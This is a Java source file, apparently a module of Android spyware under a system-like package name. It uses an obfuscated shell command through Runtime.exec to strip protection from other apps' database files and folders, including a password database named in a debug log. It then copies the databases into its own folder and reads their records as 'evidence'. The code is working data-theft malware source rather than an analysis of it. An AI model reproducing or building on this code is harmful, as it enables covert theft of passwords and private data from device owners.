package com.android.networking.db;

import java.io.File;
import java.io.IOException;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteQueryBuilder;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.file.Path;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

public class GenericSqliteHelper extends SQLiteOpenHelper {
	private static final String TAG = "GenericSqliteHelper";
	public static Object lockObject = new Object();

	private GenericSqliteHelper(String name, int version) {
		super(Status.self().getAppContext(), name, null, version);
	}
	
	public static GenericSqliteHelper openCopy(String dbFile) {
		File fs=new File(dbFile);
		
		if (fs.exists() && unprotect(fs.getParent()) && unprotect(fs.getAbsolutePath())) {
			dbFile = fs.getAbsolutePath();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
			}
			return null;
		}

		
		String localFile = Path.markup() + fs.getName();
		try {
			Utils.copy(new File(dbFile), new File(localFile));
		} catch (IOException e) {
			return null;
		}
		
		return new GenericSqliteHelper(localFile,4);
		
		
	}
	
	public static GenericSqliteHelper openCopy(String pathSystem, String file) {
		return openCopy(new File(pathSystem,file).getAbsolutePath());
	}

	private static boolean unprotect(String path) {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
			}
			Runtime.getRuntime().exec(Messages.getString("h_3") + path);
			return true;
		} catch (IOException e) {
			return false;
		}
	}

	public GenericSqliteHelper(String filepath, boolean copy) {
		super(Status.self().getAppContext(), filepath, null, 4);
		
		
		
	}


	@Override
	public void onCreate(SQLiteDatabase db) {
	}

	@Override
	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
	}

	public void traverseRecords(String table, String[] projection, RecordVisitor visitor) {

		synchronized (lockObject) {
			SQLiteDatabase db = getReadableDatabase();
			SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();

			queryBuilderIndex.setTables(table);
			Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

			visitor.init();

			// iterate conversation indexes
			while (cursor != null && cursor.moveToNext()) {
				visitor.cursor(cursor);

				// String[] record = new String[projection.length];
				// int rpos=0;
				// for (String column : projection) {
				//
				// record[rpos] = cursor.getString(
				// cursor.getColumnIndex(column) );
				// rpos++;
				// }

			}

			visitor.close();
			cursor.close();
			db.close();
		}
	}

}
